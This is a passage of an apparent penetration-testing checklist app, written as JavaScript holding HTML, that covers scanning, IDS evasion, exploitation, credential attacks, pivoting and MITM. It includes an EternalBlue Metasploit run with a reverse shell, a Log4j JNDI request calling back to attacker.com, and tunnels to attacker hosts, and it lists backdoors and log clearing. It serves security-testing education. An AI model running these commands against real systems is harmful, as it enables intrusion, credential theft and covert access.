# Active service probing with amap
amap -bqv 10.0.0.5 8080

# Database service fingerprinting
nmap -sV --script=mysql-info,ms-sql-info,oracle-sid-brute -p 1433,3306,1521 10.0.0.5</pre>
                <p class="technique-note">Accurate fingerprinting helps identify vulnerable service versions and misconfigurations. Combine multiple techniques for greater accuracy.</p>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">Network Traffic Analysis for Enumeration</h4>
                <p class="technique-description">Using passive traffic capture and analysis to enumerate network services and protocols.</p>
                <pre class="code-block">
# Basic traffic capture with tcpdump
sudo tcpdump -i eth0 -nn -s0 -w capture.pcap host 10.0.0.5

# Protocol and service statistics extraction
capinfos -TmtPc capture.pcap

# Converting captured traffic to human-readable format
tcpdump -r capture.pcap -Annt

# Extracting hostnames and IP addresses from traffic
tshark -r capture.pcap -T fields -e ip.dst -e dns.qry.name 2>/dev/null | sort | uniq

# Detecting services in use based on traffic
tshark -r capture.pcap -q -z io,phs

# DNS traffic analysis for subdomain mapping
tshark -r capture.pcap -Y 'dns' -T fields -e dns.qry.name -e dns.resp.addr | grep -v '^$' | sort | uniq</pre>
                <p class="technique-note">Passive analysis is especially valuable in high-security environments where active scanning might trigger alerts.</p>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">Firewall and IDS/IPS Evasion Techniques</h4>
                <p class="technique-description">Advanced methods to bypass security monitoring systems during network enumeration.</p>
                <pre class="code-block">
# MTU manipulation for fragmentation
sudo nmap --mtu 8 -sS 10.0.0.5

# Timing manipulation with random delays
sudo nmap -sS -T0 --scan-delay 5s 10.0.0.5

# Data payload manipulation
sudo nmap -sS --data-length 30 10.0.0.5

# IP ID manipulation with Nmap
sudo nmap -sI zombie-host.com:80 10.0.0.5

# Source MAC address spoofing
sudo nmap --spoof-mac Cisco 10.0.0.5

# Traffic manipulation with fragroute
echo "ip_frag 32" > evasion.conf
sudo fragroute -f evasion.conf 10.0.0.5

# TTL manipulation
sudo nmap --ttl 10 10.0.0.5

# Combining multiple evasion techniques
sudo nmap -sS -f -T2 --randomize-hosts --data-length 24 --spoof-mac 00:11:22:33:44:55 10.0.0.5</pre>
                <p class="technique-note">These techniques should be used responsibly and only in authorized security assessments. Combining multiple evasion methods increases the chance of bypassing defensive systems.</p>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">Enterprise Network Scanning Automation</h4>
                <p class="technique-description">Techniques for efficiently scanning large enterprise networks using automation and distributed approaches.</p>
                <pre class="code-block">
# Split target ranges across multiple scanning nodes
echo "10.0.0.0/24" > targets_node1.txt
echo "10.0.1.0/24" > targets_node2.txt

# Initial quick discovery scan
sudo masscan --ping 10.0.0.0/16 --rate=10000 -oL live_hosts.txt

# Extract discovered hosts
cat live_hosts.txt | grep open | cut -d " " -f 4 | sort -u > hosts.txt

# Top port scanning for service discovery
sudo nmap -sS -T4 --top-ports 100 -iL hosts.txt -oA top_ports

# Basic scan automation script
#!/bin/bash
TARGET_RANGE="10.0.0.0/24"
OUTPUT_DIR="scan_results"
mkdir -p $OUTPUT_DIR

# Phase 1: Host discovery
sudo masscan --ping $TARGET_RANGE --rate=5000 -oL $OUTPUT_DIR/live_hosts.txt
cat $OUTPUT_DIR/live_hosts.txt | grep open | cut -d " " -f 4 | sort -u > $OUTPUT_DIR/hosts.txt

# Phase 2: Service enumeration
sudo nmap -sS -sV -T4 -p- -iL $OUTPUT_DIR/hosts.txt -oA $OUTPUT_DIR/service_detection</pre>
                <p class="technique-note">For large networks, automation is essential. Build workflows that start with broad discovery and then focus detailed scans only on hosts with interesting services.</p>
            </div>
        </div>
        `,
        toolsHTML: `
        <div class="tools-grid">
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-radar tool-icon"></i>
                    <h4 class="tool-title">Nmap</h4>
                </div>
                <p class="tool-description">The industry standard network scanner for host discovery, port scanning, service detection, and scripted vulnerability discovery.</p>
                <a href="https://nmap.org/" target="_blank" class="tool-link">
                    <span>Website</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-broadcast-tower tool-icon"></i>
                    <h4 class="tool-title">Masscan</h4>
                </div>
                <p class="tool-description">Extremely fast port scanner, capable of scanning the entire Internet in under 6 minutes. Great for large-scale networks.</p>
                <a href="https://github.com/robertdavidgraham/masscan" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-exchange-alt tool-icon"></i>
                    <h4 class="tool-title">Responder</h4>
                </div>
                <p class="tool-description">LLMNR, NBT-NS and MDNS poisoner that can capture credentials during network scans.</p>
                <a href="https://github.com/lgandx/Responder" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-project-diagram tool-icon"></i>
                    <h4 class="tool-title">Bettercap</h4>
                </div>
                <p class="tool-description">Advanced network scanning and analysis with a modular system for different attack scenarios.</p>
                <a href="https://www.bettercap.org/" target="_blank" class="tool-link">
                    <span>Website</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-map tool-icon"></i>
                    <h4 class="tool-title">RustScan</h4>
                </div>
                <p class="tool-description">Extremely fast port scanner that can scan all 65k ports in under 3 seconds and automatically pipe results to Nmap.</p>
                <a href="https://github.com/RustScan/RustScan" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-network-wired tool-icon"></i>
                    <h4 class="tool-title">CrackMapExec</h4>
                </div>
                <p class="tool-description">Versatile network scanning and enumeration tool specifically designed for Active Directory environments.</p>
                <a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-fingerprint tool-icon"></i>
                    <h4 class="tool-title">p0f</h4>
                </div>
                <p class="tool-description">Passive OS fingerprinting tool that identifies devices based on traffic analysis without sending packets.</p>
                <a href="https://lcamtuf.coredump.cx/p0f3/" target="_blank" class="tool-link">
                    <span>Website</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-microscope tool-icon"></i>
                    <h4 class="tool-title">Wireshark</h4>
                </div>
                <p class="tool-description">Powerful network protocol analyzer for detailed traffic inspection and service discovery.</p>
                <a href="https://www.wireshark.org/" target="_blank" class="tool-link">
                    <span>Website</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-rocket tool-icon"></i>
                    <h4 class="tool-title">Hping3</h4>
                </div>
                <p class="tool-description">Advanced packet crafting tool for testing firewall rules, port scanning, and network testing.</p>
                <a href="https://github.com/antirez/hping" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-robot tool-icon"></i>
                    <h4 class="tool-title">AutoRecon</h4>
                </div>
                <p class="tool-description">Multi-threaded network reconnaissance tool which performs automated enumeration of services.</p>
                <a href="https://github.com/Tib3rius/AutoRecon" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-eye-slash tool-icon"></i>
                    <h4 class="tool-title">Fragroute</h4>
                </div>
                <p class="tool-description">Network intrusion detection system evasion toolkit for testing firewall and IDS implementations.</p>
                <a href="https://github.com/stsi/fragroute-debian" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
        </div>
        `
},

    'vulnerability-assessment': {
        title: '3. Vulnerability Assessment',
        subtitle: 'Identifying security weaknesses in network systems and services',
        priority: 'high',
        icon: '<i class="fas fa-bug" style="color: var(--warning);"></i>',
        checklistItems: [
            { groupTitle: '3.1 Network Service Vulnerabilities' },
            { id: '3.1.1', text: 'Scan for known vulnerabilities in network services' },
            { id: '3.1.2', text: 'Identify outdated service versions with vulnerabilities' },
            { id: '3.1.3', text: 'Check for default, weak, or hardcoded credentials' },
            { id: '3.1.4', text: 'Test for SSL/TLS configuration issues and vulnerabilities' },
            { id: '3.1.5', text: 'Evaluate service-specific security controls' },
            { id: '3.1.6', text: 'Test for improper access control mechanisms' },
            
            { groupTitle: '3.2 Network Device Assessment' },
            { id: '3.2.1', text: 'Identify vulnerabilities in routers and switches' },
            { id: '3.2.2', text: 'Test security of firewalls and IDS/IPS systems' },
            { id: '3.2.3', text: 'Assess VPN configurations and implementations' },
            { id: '3.2.4', text: 'Check for vulnerabilities in load balancers and proxies' },
            { id: '3.2.5', text: 'Evaluate network storage systems for vulnerabilities' },
            { id: '3.2.6', text: 'Test IoT devices and specialized hardware' },
            
            { groupTitle: '3.3 Configuration Assessment' },
            { id: '3.3.1', text: 'Review device configurations against hardening benchmarks' },
            { id: '3.3.2', text: 'Analyze network segmentation effectiveness' },
            { id: '3.3.3', text: 'Test access control lists and filtering rules' },
            { id: '3.3.4', text: 'Evaluate password policies and account restrictions' },
            { id: '3.3.5', text: 'Check for insecure management interfaces' },
            { id: '3.3.6', text: 'Assess backup and recovery configurations' },
            
            { groupTitle: '3.4 Specialized Vulnerability Testing' },
            { id: '3.4.1', text: 'Perform authenticated vulnerability scans where possible' },
            { id: '3.4.2', text: 'Test for protocol-specific vulnerabilities' },
            { id: '3.4.3', text: 'Evaluate network services for DoS vulnerabilities' },
            { id: '3.4.4', text: 'Identify information disclosure vulnerabilities' },
            { id: '3.4.5', text: 'Create comprehensive vulnerability reports with CVSS scoring' },
            { id: '3.4.6', text: 'Assess supply chain vulnerabilities in network components' }
        ],
        techniquesHTML: `
        <div class="techniques-list">
            <div class="technique-item">
                <h4 class="technique-title">Vulnerability Scanning Methodology</h4>
                <p class="technique-description">A structured approach to thoroughly assess network services for vulnerabilities.</p>
                <ol>
                    <li><strong>Discovery Scan:</strong> Initial scan to identify hosts and open ports</li>
                    <li><strong>Service Enumeration:</strong> Detailed service and version detection</li>
                    <li><strong>Basic Vulnerability Scan:</strong> Unauthenticated scan for common vulnerabilities</li>
                    <li><strong>Authenticated Scanning:</strong> Deeper assessment with credentials when available</li>
                    <li><strong>Targeted Scanning:</strong> Service-specific vulnerability checks</li>
                    <li><strong>Manual Verification:</strong> Validating results to eliminate false positives</li>
                    <li><strong>Risk Assessment:</strong> Prioritizing findings based on exploitability and impact</li>
                    <li><strong>Compliance Mapping:</strong> Correlating findings with compliance requirements</li>
                </ol>
                <pre class="code-block">
# Nessus CLI scan example (using nessusd)
nessuscli scan --policy "Advanced Scan" --targets 10.0.0.0/24 --name "Network Assessment"

# OpenVAS scan example
omp -u admin -w password -C \
    --name "Network Assessment" \
    --target "10.0.0.0/24" \
    --config "Full and fast"
    
# Using Nuclei for targeted vulnerability scanning
nuclei -l targets.txt -t cves/ -severity critical,high

# Custom Nmap vulnerability scan
nmap -sV --script vuln -p 1-65535 10.0.0.5</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">SSL/TLS Security Assessment</h4>
                <p class="technique-description">Comprehensive evaluation of TLS implementations and configurations.</p>
                <ul>
                    <li>Identifying obsolete protocols (SSL 2.0/3.0, TLS 1.0/1.1)</li>
                    <li>Testing for weak cipher suites and vulnerable configurations</li>
                    <li>Checking for certificate issues (expiration, self-signed, weak algorithms)</li>
                    <li>Evaluating for known vulnerabilities (Heartbleed, POODLE, BEAST, FREAK, etc.)</li>
                    <li>Testing perfect forward secrecy implementation</li>
                    <li>Verifying certificate revocation mechanisms (OCSP, CRL)</li>
                    <li>Checking for HTTP Strict Transport Security (HSTS)</li>
                </ul>
                <pre class="code-block">
# Using sslscan to test SSL/TLS configuration
sslscan --no-failed 10.0.0.5:443

# Testing with testssl.sh for comprehensive analysis
./testssl.sh --all 10.0.0.5:443

# Using nmap scripts for SSL/TLS testing
nmap --script ssl-enum-ciphers,ssl-dh-params,ssl-heartbleed -p 443 10.0.0.5

# Testing for certificate validation issues
openssl s_client -connect 10.0.0.5:443 -showcerts -servername example.com

# Checking OCSP stapling
openssl s_client -connect 10.0.0.5:443 -status -servername example.com</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">Network Device Configuration Assessment</h4>
                <p class="technique-description">Methodical evaluation of network devices against security benchmarks.</p>
                <pre class="code-block">
# Cisco configuration analysis with NIPPER
nipper --input=cisco-config.txt --output=cisco-report.html

# Router/switch configuration backup and analysis
python routersploit.py

# Automated vulnerability scanning of network devices
nmap -sV --script cisco --script-args creds.cisco="admin:password" 10.0.0.1

# Analyze Cisco configuration against CIS benchmarks
python3 cisco_config_analyzer.py --config router-config.txt --benchmark cis

# Test for default credentials on network devices
hydra -L user.txt -P pass.txt 10.0.0.1 ssh

# Testing SNMPv3 security
snmpwalk -v3 -u admin -l authPriv -a SHA -A authpass -x AES -X privpass 10.0.0.1</pre>
                <p>Key configuration checks:</p>
                <ul>
                    <li>Unused service disablement (HTTP, Telnet, SNMP v1/v2)</li>
                    <li>Management interface restrictions</li>
                    <li>Authentication mechanisms (local, RADIUS, TACACS+)</li>
                    <li>Access control list implementation</li>
                    <li>Logging and monitoring configuration</li>
                    <li>Firmware/OS versions and patch levels</li>
                    <li>SSH key length and algorithm strength</li>
                    <li>Control plane protection mechanisms</li>
                </ul>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">API Security Assessment</h4>
                <p class="technique-description">Testing for vulnerabilities in network-exposed APIs.</p>
                <pre class="code-block">
# Enumerate API endpoints using ffuf
ffuf -w wordlist.txt -u https://api.example.com/FUZZ

# Test for injection vulnerabilities
sqlmap -u "https://api.example.com/users?id=1"

# Check for weak authentication
curl -X GET https://api.example.com/users -H "Authorization: Bearer 123456"

# Test for improper access controls
curl -X GET https://api.example.com/admin/users -H "Authorization: Bearer valid_user_token"

# Test for rate limiting
for i in {1..100}; do curl -s -o /dev/null https://api.example.com/users; done

# Check for sensitive information in responses
curl -X GET https://api.example.com/users/1 | grep -E "password|secret|key|token"</pre>
            </div>
        </div>
        `,
        toolsHTML: `
        <div class="tools-grid">
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-search-location tool-icon"></i>
                    <h4 class="tool-title">Nessus</h4>
                </div>
                <p class="tool-description">Comprehensive vulnerability scanner with extensive network service vulnerability detection capabilities.</p>
                <a href="https://www.tenable.com/products/nessus" target="_blank" class="tool-link">
                    <span>Website</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-shield-alt tool-icon"></i>
                    <h4 class="tool-title">OpenVAS</h4>
                </div>
                <p class="tool-description">Open-source vulnerability assessment system with over 50,000 vulnerability tests.</p>
                <a href="https://www.openvas.org/" target="_blank" class="tool-link">
                    <span>Website</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-lock tool-icon"></i>
                    <h4 class="tool-title">testssl.sh</h4>
                </div>
                <p class="tool-description">Advanced command line tool for testing SSL/TLS services for vulnerabilities and best practices.</p>
                <a href="https://github.com/drwetter/testssl.sh" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-network-wired tool-icon"></i>
                    <h4 class="tool-title">Nipper</h4>
                </div>
                <p class="tool-description">Network infrastructure configuration security analyzer, specifically focused on network devices.</p>
                <a href="https://www.titania.com/products/nipper/" target="_blank" class="tool-link">
                    <span>Website</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-rocket tool-icon"></i>
                    <h4 class="tool-title">Nuclei</h4>
                </div>
                <p class="tool-description">Fast and customizable vulnerability scanner that uses YAML-based templates for targeted testing.</p>
                <a href="https://github.com/projectdiscovery/nuclei" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-terminal tool-icon"></i>
                    <h4 class="tool-title">RouterSploit</h4>
                </div>
                <p class="tool-description">Framework dedicated to embedded device vulnerability testing, focusing on network devices.</p>
                <a href="https://github.com/threat9/routersploit" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
        </div>
        `
    },
    'exploitation': {
        title: '4. Network Exploitation',
        subtitle: 'Exploiting identified vulnerabilities to gain access to network systems',
        priority: 'critical',
        icon: '<i class="fas fa-user-secret" style="color: var(--danger);"></i>',
        checklistItems: [
            { groupTitle: '4.1 Target Exploitation' },
            { id: '4.1.1', text: 'Exploit vulnerabilities in network services' },
            { id: '4.1.2', text: 'Perform password attacks against authentication services' },
            { id: '4.1.3', text: 'Target network protocol vulnerabilities' },
            { id: '4.1.4', text: 'Exploit zero-day or recently disclosed vulnerabilities' },
            { id: '4.1.5', text: 'Customize existing exploits for target environment' },
            { id: '4.1.6', text: 'Develop and test network-based exploit chains' },
            
            { groupTitle: '4.2 Credential Attacks' },
            { id: '4.2.1', text: 'Capture and crack password hashes' },
            { id: '4.2.2', text: 'Perform online password brute-forcing' },
            { id: '4.2.3', text: 'Use password spraying techniques for account lockout avoidance' },
            { id: '4.2.4', text: 'Leverage obtained credentials across services' },
            { id: '4.2.5', text: 'Attack authentication tokens and session mechanisms' },
            { id: '4.2.6', text: 'Exploit SSO and federated authentication weaknesses' },
            
            { groupTitle: '4.3 Network Pivoting' },
            { id: '4.3.1', text: 'Utilize compromised hosts as pivot points' },
            { id: '4.3.2', text: 'Set up tunneling through compromised systems' },
            { id: '4.3.3', text: 'Bypass network segmentation through pivoting' },
            { id: '4.3.4', text: 'Implement advanced routing techniques' },
            { id: '4.3.5', text: 'Use compromised devices for internal scanning' },
            { id: '4.3.6', text: 'Exploit trust relationships between network segments' },
            
            { groupTitle: '4.4 Protocol-Specific Attacks' },
            { id: '4.4.1', text: 'Execute MITM attacks where applicable' },
            { id: '4.4.2', text: 'Exploit trust relationships between systems' },
            { id: '4.4.3', text: 'Leverage protocol downgrade vulnerabilities' },
            { id: '4.4.4', text: 'Perform relay attacks (e.g., NTLM Relay)' },
            { id: '4.4.5', text: 'Document successful exploitation paths thoroughly' },
            { id: '4.4.6', text: 'Exploit insecure service interactions and proxies' }
        ],
        techniquesHTML: `
        <div class="techniques-list">
            <div class="technique-item">
                <h4 class="technique-title">Targeted Exploitation Methodology</h4>
                <p class="technique-description">Systematic approach to exploiting identified vulnerabilities with minimal risk of system disruption.</p>
                <ol>
                    <li><strong>Vulnerability Validation:</strong> Verify vulnerability existence without full exploitation</li>
                    <li><strong>Exploitation Planning:</strong> Select appropriate exploits and set conservative options</li>
                    <li><strong>Testing Environment:</strong> When possible, test exploits on similar systems</li>
                    <li><strong>Execution:</strong> Run exploit with careful monitoring of target stability</li>
                    <li><strong>Post-Exploitation:</strong> Secure access and minimize footprint</li>
                    <li><strong>Documentation:</strong> Record exact steps, tools, and outcomes</li>
                    <li><strong>Impact Assessment:</strong> Measure and document the real-world impact</li>
                </ol>
                <pre class="code-block">
# Using Metasploit for controlled exploitation
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.0.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
# Safe exploitation options
set AutoCheck true
set CheckModule auxiliary/scanner/smb/smb_ms17_010
run

# Manually exploiting Apache Log4j vulnerability
# Send crafted request with JNDI lookup string
curl -H "User-Agent: $jndi:ldap://attacker.com/a" http://target-app:8080/

# Using specialized RCE exploit tools
python3 log4j-exploit-framework.py --target-url http://vulnerable-app:8080/ --callback-url ldap://attacker.com:1389/

# Creating a customized exploit based on CVE
searchsploit apache 2.4.49
searchsploit -m 50383
# Modify the exploit code for the specific target
vim 50383.py
python3 50383.py http://target:80/</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">Advanced Password Attacks</h4>
                <p class="technique-description">Techniques for effective password attacks while avoiding account lockouts and detection.</p>
                <pre class="code-block">
# Password spraying with CrackMapExec
crackmapexec smb 10.0.0.0/24 -u users.txt -p 'Spring2025!' --continue-on-success

# Hash cracking with Hashcat for captured NetNTLMv2 hashes
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule

# Targeted Kerberoasting with Impacket
GetUserSPNs.py -request -dc-ip 10.0.0.10 domain.local/user:password

# Password spraying timing (avoid lockouts)
for u in $(cat users.txt); do
    crackmapexec smb 10.0.0.5 -u $u -p passwords.txt --continue-on-success
    sleep 30
done

# Smart brute forcing based on password policies
grep -v -E '^.{,7}$|[^0-9]$|^[^A-Z]' wordlist.txt > policy_compliant_wordlist.txt
hydra -L users.txt -P policy_compliant_wordlist.txt ssh://10.0.0.5

# JWT token attacks - cracking secret
python3 jwt_tool.py eyJhbGciOiJS[...] -C -d wordlist.txt

# OAuth token exploitation
curl -X POST https://api.target.com/oauth/token -d "grant_type=password&username=admin&password=password"</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">Network Pivoting Techniques</h4>
                <p class="technique-description">Methods to pivot through compromised systems to reach otherwise inaccessible network segments.</p>
                <pre class="code-block">
# SSH pivoting
ssh -D 9050 user@compromised_host
proxychains nmap -sT -Pn -p 80,443,445 10.10.10.0/24

# Metasploit pivoting
meterpreter > run autoroute -s 10.10.10.0/24
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.5

# Socat port forwarding
socat TCP-LISTEN:8080,fork TCP:internal_server:80

# Chisel for advanced pivoting
# On attacker:
./chisel server -p 8080 --reverse
# On compromised host:
./chisel client 192.168.1.100:8080 R:socks

# Using ligolo-ng for layer 3 pivoting
# On attacker:
./ligolo-ng -selfcert
# On compromised host:
./ligolo-ng agent -connect attacker.com:11601 -ignore-cert

# DNS tunneling for restrictive environments
# On attacker server:
iodine -f -c -P password 10.0.0.1 tunnel.mydomain.com
# On compromised client:
iodined -f -c -P password 10.0.0.2 tunnel.mydomain.com</pre>
                <p>Key considerations for successful pivoting:</p>
                <ul>
                    <li>Understanding target network topology</li>
                    <li>Selecting appropriate pivoting technique based on network controls</li>
                    <li>Managing multiple pivot points across segmented networks</li>
                    <li>Minimizing detection through controlled traffic patterns</li>
                    <li>Establishing persistent access while maintaining stealth</li>
                    <li>Adapting to network security controls and filtering</li>
                </ul>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">Protocol Downgrade and MITM Attacks</h4>
                <p class="technique-description">Techniques to exploit protocol weaknesses and intercept network communications.</p>
                <pre class="code-block">
# ARP spoofing with Bettercap
sudo bettercap -iface eth0
> set arp.spoof.targets 10.0.0.5
> arp.spoof on
> net.sniff on

# HTTPS downgrade with SSLstrip+
sudo bettercap -iface eth0
> set http.proxy.sslstrip true
> http.proxy on
> set arp.spoof.targets 10.0.0.5
> arp.spoof on

# SMB relay attack with ntlmrelayx
sudo python3 ntlmrelayx.py -t smb://10.0.0.5 -smb2support

# WPAD/PAC injection for proxy interception
sudo responder -I eth0 --wpad -v

# Exploiting vulnerable service APIs
# OAuth authentication bypass
curl -X POST https://api.victim.com/oauth/token -H "Authorization: Basic YWRtaW46cGFzc3dvcmQ=" -d "grant_type=client_credentials"</pre>
            </div>
        </div>
        `,
        toolsHTML: `
        <div class="tools-grid">
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-wrench tool-icon"></i>
                    <h4 class="tool-title">Metasploit Framework</h4>
                </div>
                <p class="tool-description">Comprehensive exploitation framework with thousands of modules for network service exploitation.</p>
                <a href="https://www.metasploit.com/" target="_blank" class="tool-link">
                    <span>Website</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-key tool-icon"></i>
                    <h4 class="tool-title">Hydra</h4>
                </div>
                <p class="tool-description">Fast and flexible online password cracking tool supporting numerous protocols.</p>
                <a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-map-signs tool-icon"></i>
                    <h4 class="tool-title">CrackMapExec</h4>
                </div>
                <p class="tool-description">Post-exploitation tool designed for network lateral movement and credential attacks.</p>
                <a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-route tool-icon"></i>
                    <h4 class="tool-title">Chisel</h4>
                </div>
                <p class="tool-description">Fast TCP/UDP tunnel over HTTP, transported via a single SSH connection. Excellent for pivoting.</p>
                <a href="https://github.com/jpillora/chisel" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-user-secret tool-icon"></i>
                    <h4 class="tool-title">Impacket</h4>
                </div>
                <p class="tool-description">Collection of Python classes for working with network protocols, particularly useful for Windows/Active Directory attacks.</p>
                <a href="https://github.com/SecureAuthCorp/impacket" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-project-diagram tool-icon"></i>
                    <h4 class="tool-title">Ligolo-ng</h4>
                </div>
                <p class="tool-description">Advanced pivoting tool that creates a tunnel between attacker and target machine with full layer 3 capabilities.</p>
                <a href="https://github.com/nicocha30/ligolo-ng" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
        </div>
        `
    },
    'post-exploitation': {
        title: '5. Post-Exploitation',
        subtitle: 'Actions taken after gaining access to network systems',
        priority: 'high',
        icon: '<i class="fas fa-flag" style="color: var(--warning);"></i>',
        checklistItems: [
            { groupTitle: '5.1 Privilege Escalation' },
            { id: '5.1.1', text: 'Escalate privileges on compromised systems' },
            { id: '5.1.2', text: 'Identify and exploit local vulnerabilities' },
            { id: '5.1.3', text: 'Leverage misconfigurations for elevated access' },
            { id: '5.1.4', text: 'Exploit weak service permissions and configurations' },
            { id: '5.1.5', text: 'Use credential harvesting for privilege escalation' },
            { id: '5.1.6', text: 'Exploit containerization and virtualization vulnerabilities' },
            
            { groupTitle: '5.2 Persistence' },
            { id: '5.2.1', text: 'Establish persistent access to compromised systems' },
            { id: '5.2.2', text: 'Create backdoor accounts or access methods' },
            { id: '5.2.3', text: 'Implement stealth persistence techniques' },
            { id: '5.2.4', text: 'Set up command and control channels' },
            { id: '5.2.5', text: 'Ensure persistence across system reboots' },
            { id: '5.2.6', text: 'Implement redundant access methods' },
            
            { groupTitle: '5.3 Data Collection' },
            { id: '5.3.1', text: 'Identify and collect sensitive information' },
            { id: '5.3.2', text: 'Capture network traffic for credential harvesting' },
            { id: '5.3.3', text: 'Extract configuration files and system settings' },
            { id: '5.3.4', text: 'Collect network diagrams and documentation' },
            { id: '5.3.5', text: 'Gather evidence to demonstrate impact' },
            { id: '5.3.6', text: 'Map internal network and identify critical assets' },
            
            { groupTitle: '5.4 Cleanup and Documentation' },
            { id: '5.4.1', text: 'Remove artifacts from exploitation activities' },
            { id: '5.4.2', text: 'Clear logs and evidence of access' },
            { id: '5.4.3', text: 'Restore modified configurations if needed' },
            { id: '5.4.4', text: 'Document complete attack paths and findings' },
            { id: '5.4.5', text: 'Create remediation recommendations based on findings' },
            { id: '5.4.6', text: 'Develop targeted hardening recommendations for affected systems' }
        ],
        techniquesHTML: `
        <div class="techniques-list">
            <div class="technique-item">
                <h4 class="technique-title">Privilege Escalation Techniques for Network Devices</h4>
                <p class="technique-description">Methods to elevate privileges on various network infrastructure devices.</p>
                <ul>
                    <li><strong>Cisco Devices:</strong>
                        <ul>
                            <li>Password recovery exploitation</li>
                            <li>SNMP read/write community string abuse</li>
                            <li>Exploiting vulnerable IOS versions</li>
                            <li>Configuration extraction and modification</li>
                            <li>Smart Install protocol abuse</li>
                            <li>Cisco Discovery Protocol (CDP) exploitation</li>
                        </ul>
                    </li>
                    <li><strong>Network Appliances:</strong>
                        <ul>
                            <li>Default account exploitation</li>
                            <li>Web interface vulnerabilities</li>
                            <li>Firmware extraction and analysis</li>
                            <li>Command injection in management interfaces</li>
                            <li>API endpoint privilege escalation</li>
                            <li>Backup configuration file extraction</li>
                        </ul>
                    </li>
                </ul>
                <pre class="code-block">
# Exploiting Cisco Smart Install on vulnerable switches
python3 siet.py -g -i 10.0.0.5

# Leveraging SNMP write access to modify device configuration
snmpset -v 2c -c private 10.0.0.5 \
  .1.3.6.1.4.1.9.9.96.1.1.1.1.2.X i 1 \
  .1.3.6.1.4.1.9.9.96.1.1.1.1.3.X i 4 \
  .1.3.6.1.4.1.9.9.96.1.1.1.1.4.X i 1 \
  .1.3.6.1.4.1.9.9.96.1.1.1.1.5.X a "int vlan1 ; ip address 10.1.1.1 255.255.255.0"

# Exploiting vulnerable web interfaces on network devices
curl -X POST "https://10.0.0.5/api/config" \
  -H "Content-Type: application/json" \
